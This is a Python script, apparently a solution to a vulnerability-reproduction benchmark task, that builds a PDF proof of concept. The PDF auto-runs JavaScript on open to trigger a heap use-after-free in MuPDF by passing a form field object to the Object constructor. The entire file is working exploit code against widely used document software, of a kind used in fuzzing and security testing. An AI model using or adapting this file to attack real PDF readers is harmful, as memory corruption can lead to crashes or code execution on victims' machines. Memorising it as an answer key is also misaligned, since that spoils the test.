import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in MuPDF.
        The vulnerability occurs when a PDF Dictionary (like a Field object) is passed 
        to the Object() constructor in JavaScript, failing to increment the reference count.
        """
        
        # JavaScript payload
        # 1. Access a Field object (which wraps a PDF Dictionary)
        # 2. Pass it to the Object constructor
        # 3. This creates a new reference without incrementing the counter in the vulnerable version
        # 4. Cleanup triggers the UAF/Double Free
        js_content = b"var f = this.getField('F'); var o = new Object(f);"
        
        # PDF Objects
        # 1: Catalog
        # 2: Pages
        # 3: Page
        # 4: AcroForm
        # 5: Field (Widget)
        # 6: OpenAction (JavaScript)
        # 7: JS Stream
        objects = [
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R /OpenAction 6 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Annots [5 0 R] >>",
            b"<< /Fields [5 0 R] >>",
            b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (F) /Rect [0 0 100 100] /P 3 0 R >>",
            b"<< /Type /Action /S /JavaScript /JS 7 0 R >>",
            b"<< /Length " + str(len(js_content)).encode() + b" >> stream\n" + js_content + b"\nendstream"
        ]
        
        # Construct PDF body
        pdf = [b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"]
        xref_offsets = []
        
        current_offset = len(pdf[0])
        
        # Write objects
        for i, obj_data in enumerate(objects):
            obj_id = i + 1
            xref_offsets.append(current_offset)
            obj_str = f"{obj_id} 0 obj\n".encode() + obj_data + b"\nendobj\n"
            pdf.append(obj_str)
            current_offset += len(obj_str)
            
        # Write Xref
        xref_start = current_offset
        pdf.append(b"xref\n")
        pdf.append(f"0 {len(objects) + 1}\n".encode())
        pdf.append(b"0000000000 65535 f \n")
        for offset in xref_offsets:
            pdf.append(f"{offset:010} 00000 n \n".encode())
            
        # Write Trailer
        pdf.append(b"trailer\n")
        pdf.append(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode())
        pdf.append(b"startxref\n")
        pdf.append(f"{xref_start}\n".encode())
        pdf.append(b"%%EOF")
        
        return b"".join(pdf)